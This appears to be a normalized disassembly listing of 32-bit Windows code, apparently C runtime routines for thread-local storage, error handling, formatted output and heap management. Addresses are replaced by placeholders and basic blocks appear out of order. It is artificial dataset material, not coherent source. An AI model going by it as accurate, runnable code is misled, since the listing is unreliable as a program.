pop ecx
sub_407b23
mov edi edi
push esi
push edi
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov edi eax
test edi edi
je r-xdata
push esi
call sub_406294
pop ecx
call sub_40783d
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_407800
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_40657e
push [ rw-data ]
call sub_407713
push [ rw-data ]
mov [ rw-data ] eax
call sub_407713
push [ rw-data ]
mov [ rw-data ] eax
call sub_407713
push [ rw-data ]
mov [ rw-data ] eax
call sub_407713
add esp 0x10
mov [ rw-data ] eax
call sub_408d7f
test eax eax
je r-xdata
test eax eax
jne r-xdata
push sub_4079f4
push [ rw-data ]
call sub_40778e
pop ecx
call eax
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_40ed09
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_40778e
pop ecx
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_40787a
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
retn
sub_407cb0
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_404a6a
mov ebx [ ebp + 0x8 ]
mov esi 0x100
cmp ebx esi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_407f64
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_40b554
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_40b59f
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xcc ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_40b50f
add esp 0x24
test eax eax
je r-xdata
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_407dd4
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x328 ] 0x0
push ebx
push 0x4c
lea eax [ ebp - 0x324 ]
push 0x0
push eax
call sub_40b0d0
lea eax [ ebp - 0x328 ]
mov [ ebp - 0x2d8 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x2d4 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x20c ] ecx
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov [ ebp - 0x328 ] 0xc0000417
mov [ ebp - 0x324 ] 0x1
mov [ ebp - 0x31c ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov ebx eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x2d8 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push 0xc0000417
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_4061c0
leave
retn
test ebx ebx
jne r-xdata
push 0x2
call sub_40f290
pop ecx
sub_407efc
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call sub_40778e
pop ecx
test eax eax
je r-xdata
push 0x2
call sub_40f290
pop ecx
pop ebp
jmp sub_407dd4
pop ebp
jmp eax
sub_407f22
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_407f8a
mov edi edi
push ebp
mov ebp esp
push esi
call sub_407f77
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_407f22
pop ecx
mov esi eax
call sub_407f64
mov [ eax ] esi
pop esi
pop ebp
retn
sub_407fad
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_40b01d
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_407f64
mov [ eax ] 0x9
push ebx
xor ebx ebx
test al 0x1
je r-xdata
call sub_407f64
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_40a128
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_40e709
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
cmp edi ebx
mov [ esi + 0x4 ] ecx
jle r-xdata
push [ ebp + 0xc ]
call sub_40f47f
pop ecx
test eax eax
jne r-xdata
call sub_40a128
add eax 0x40
cmp esi eax
jne r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
and eax 0xff
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_40e709
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_40f436
pop ecx
pop edi
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push ebx
push ebx
push ecx
call sub_40f31d
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_408111
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_407fad
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_408144
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ebp + 0x8 ]
dec [ ebp + 0xc ]
call sub_408111
cmp [ esi ] 0xffffffff
je r-xdata
pop esi
pop ebp
retn
sub_40816a
mov edi edi
push ebp
mov ebp esp
test [ edi + 0xc ] 0x40
push ebx
push esi
mov esi eax
mov ebx ecx
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov al [ ebx ]
dec [ ebp + 0x8 ]
mov ecx edi
call sub_408111
inc ebx
cmp [ esi ] 0xffffffff
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
add [ esi ] eax
jmp r-xdata
call sub_407f64
cmp [ eax ] 0x2a
jne r-xdata
mov ecx edi
mov al 0x3f
call sub_408111
sub_4081b7
mov edi edi
push ebp
mov ebp esp
sub esp 0x278
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x25c ]
mov [ ebp - 0x24c ] esi
mov [ ebp - 0x224 ] edi
mov [ ebp - 0x248 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x230 ] eax
mov [ ebp - 0x240 ] eax
mov [ ebp - 0x238 ] eax
call sub_404a6a
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_407f64
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_407efc
add esp 0x14
cmp [ ebp - 0x250 ] 0x0
je r-xdata
xor ecx ecx
cmp ebx ecx
je r-xdata
push esi
call sub_40b01d
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ ebx ]
mov [ ebp - 0x228 ] ecx
mov [ ebp - 0x220 ] ecx
mov [ ebp - 0x244 ] ecx
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4061c0
leave
retn
cmp [ ebp - 0x250 ] 0x0
je r-xdata
inc ebx
cmp [ ebp - 0x228 ] 0x0
mov [ ebp - 0x23c ] ebx
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x228 ]
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov al dl
sub al 0x20
cmp al 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
xor esi esi
xor eax eax
movsx eax dl
movsx eax [ eax + r--data ]
and eax 0xf
xor esi esi
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov ebx [ ebp - 0x23c ]
mov al [ ebx ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + r-xdata ]
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
mov [ ebp - 0x26c ] eax
cmp eax ecx
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov ecx [ ebp - 0x26c ]
mov edi [ ebp - 0x224 ]
mov dl al
jmp r-xdata
sub_408d4f
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] eax
push 0x0
sete al
push 0x1000
push eax
call [ HeapCreate@IAT ]
mov [ rw-data ] eax
test eax eax
jne r-xdata
xor eax eax
inc eax
mov [ rw-data ] eax
pop ebp
retn
pop ebp
retn
sub_408d7f
mov edi edi
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call sub_40df76
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_408dca
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_404d8e
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_408e38
push 0xc
push r--data
call sub_4099f4
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_409d87
push 0x1e
call sub_409bdc
push 0xff
call sub_406318
push 0x18
call sub_40ecc4
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_408efb
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_407f64
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_409a39
retn
push edi
call sub_404d8e
pop ecx
push 0xfa0
push edi
call sub_40df76
pop ecx
pop ecx
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_404d8e
pop ecx
call sub_407f64
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_408ef2
mov eax [ ebp - 0x1c ]
sub_408efb
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_408e38
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_4062c4
pop ecx
sub_408f2e
mov edi edi
push ebp
mov ebp esp
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
add ecx eax
jmp r-xdata
cmp eax ecx
jb r-xdata
mov edx [ ebp + 0x8 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb r-xdata
xor eax eax
pop ebp
retn
add eax 0x14
sub_408f5e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi esi
sub edi [ ecx + 0xc ]
add esi 0xfffffffc
shr edi 0xf
mov ecx edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ esi ]
dec ecx
mov [ ebp - 0x4 ] ecx
test cl 0x1
jne r-xdata
pop edi
pop esi
leave
retn
push ebx
lea ebx [ ecx + esi ]
mov edx [ ebx ]
mov [ ebp - 0xc ] edx
mov edx [ esi - 0x4 ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0xc ]
mov [ ebp + 0xc ] ebx
test dl 0x1
jne r-xdata
mov edx ecx
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
mov ebx [ ebp - 0x8 ]
and ebx 0x1
mov [ ebp - 0xc ] ebx
jne r-xdata
push 0x3f
pop edx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
push 0x3f
pop edx
mov ebx [ ebp + 0x8 ]
sub esi [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
sar ebx 0x4
push 0x3f
mov [ ebp + 0xc ] esi
dec ebx
pop esi
cmp ebx esi
jbe r-xdata
mov edx [ ebx + 0x8 ]
mov ebx [ ebx + 0x4 ]
mov ecx [ ebp - 0x4 ]
add ecx [ ebp - 0xc ]
mov [ edx + 0x4 ] ebx
mov edx [ ebp + 0xc ]
mov ebx [ edx + 0x4 ]
mov edx [ edx + 0x8 ]
mov [ ebx + 0x8 ] edx
mov [ ebp - 0x4 ] ecx
mov ebx 0x80000000
cmp edx 0x20
jae r-xdata
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edx * 8 ]
mov ebx [ ecx + 0x4 ]
mov [ esi + 0x8 ] ecx
mov [ esi + 0x4 ] ebx
mov [ ecx + 0x4 ] esi
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov ecx [ esi + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
cmp ebx edx
je r-xdata
add ecx [ ebp - 0x8 ]
mov edx ecx
sar edx 0x4
dec edx
mov [ ebp - 0x4 ] ecx
cmp edx esi
jbe r-xdata
mov ebx esi
lea ecx [ edx - 0x20 ]
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx edx
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov [ eax + esi - 0x4 ] eax
mov eax [ ebp - 0x10 ]
dec [ eax ]
jne r-xdata
mov cl [ edx + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
mov [ edx + eax + 0x4 ] cl
cmp edx 0x20
jae r-xdata
cmp ebx edx
je r-xdata
mov edx esi
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
pop ebx
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov esi [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] edi
mov ecx [ rw-data ]
mov esi [ VirtualFree@IAT ]
push 0x4000
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push ebx
push ecx
call esi
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
mov ecx [ rw-data ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
lea ecx [ edx - 0x20 ]
mov edx 0x80000000
shr edx cl
lea eax [ eax + edi * 4 + 0xc4 ]
or [ eax ] edx
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea eax [ eax + edi * 4 + 0x44 ]
or [ eax ] ebx
jmp r-xdata
mov ecx edx
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ esi + 0x8 ] ecx
mov esi 0x80000000
cmp ebx 0x20
jae r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rw-data ]
lea ecx [ ebx - 0x20 ]
shr esi cl
not esi
and [ eax + edi * 4 + 0xc4 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
mov ecx ebx
shr esi cl
not esi
and [ eax + edi * 4 + 0x44 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
push ebx
push 0x0
push [ eax + 0xc ]
call esi
mov eax [ rw-data ]
push [ eax + 0x10 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
mov edx [ rw-data ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_40f710
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rw-data ]
cmp eax [ rw-data ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
and [ ecx ] esi
jmp r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
sub [ ebp + 0x8 ] 0x14
sub_409274
mov eax [ rw-data ]
push esi
mov esi [ rw-data ]
push edi
xor edi edi
cmp esi eax
jne r-xdata
imul esi esi 0x14
add esi [ rw-data ]
push 0x41c4
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ esi + 0x10 ] eax
cmp eax edi
je r-xdata
add eax 0x10
imul eax eax 0x14
push eax
push [ rw-data ]
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
mov [ esi + 0xc ] eax
cmp eax edi
jne r-xdata
add [ rw-data ] 0x10
mov esi [ rw-data ]
mov [ rw-data ] eax
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rw-data ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rw-data ]
call [ HeapFree@IAT ]
jmp r-xdata
sub_409324
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
push ebx
push esi
mov esi [ ecx + 0x10 ]
push edi
xor ebx ebx
jmp r-xdata
test eax eax
jge r-xdata
add eax eax
inc ebx
mov eax ebx
imul eax eax 0x204
lea eax [ eax + esi + 0x144 ]
push 0x3f
mov [ ebp - 0x8 ] eax
pop edx
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne r-xdata
push 0x4
mov edi ebx
push 0x1000
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne r-xdata
lea edx [ edi + 0x7000 ]
mov [ ebp - 0x4 ] edx
cmp edi edx
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1f8
lea ecx [ edi + 0xc ]
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
xor edi edi
inc edi
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne r-xdata
mov ecx edx
sub ecx edi
shr ecx 0xc
lea eax [ edi + 0x10 ]
inc ecx
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea edx [ eax + 0xffc ]
mov [ eax ] edx
lea edx [ eax - 0x1004 ]
mov [ eax - 0x4 ] 0xff0
mov [ eax + 0x4 ] edx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
dec ecx
jne r-xdata
mov edx [ ebp - 0x4 ]
sub_40942c
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov edx edi
sub edx [ ecx + 0xc ]
add esi 0x17
shr edx 0xf
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ edi - 0x4 ]
and esi 0xfffffff0
dec ecx
cmp esi ecx
lea edi [ ecx + edi - 0x4 ]
mov ebx [ edi ]
mov [ ebp + 0x10 ] ecx
mov [ ebp - 0x4 ] ebx
jle r-xdata
jge r-xdata
test bl 0x1
jne r-xdata
xor eax eax
inc eax
mov ebx [ ebp + 0xc ]
sub [ ebp + 0x10 ] esi
lea ecx [ esi + 0x1 ]
mov [ ebx - 0x4 ] ecx
lea ebx [ ebx + esi - 0x4 ]
mov esi [ ebp + 0x10 ]
sar esi 0x4
dec esi
mov [ ebp + 0xc ] ebx
mov [ ebx - 0x4 ] ecx
cmp esi 0x3f
jbe r-xdata
xor eax eax
jmp r-xdata
add ebx ecx
cmp esi ebx
jg r-xdata
test [ ebp - 0x4 ] 0x1
jne r-xdata
push 0x3f
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
dec ecx
mov [ ebp - 0x8 ] ecx
cmp ecx 0x3f
jbe r-xdata
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] edi
mov [ ecx + 0x4 ] ebx
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x10 ]
mov [ ebx ] eax
mov [ eax + ebx - 0x4 ] eax
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
mov [ esi + eax + 0x4 ] cl
cmp esi 0x20
jae r-xdata
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop esi
mov ecx [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ecx [ edi + 0x4 ]
mov edi [ edi + 0x8 ]
mov [ ecx + 0x8 ] edi
mov ecx [ ebp + 0x10 ]
sub ecx esi
add [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov ebx 0x80000000
cmp ecx 0x20
jae r-xdata
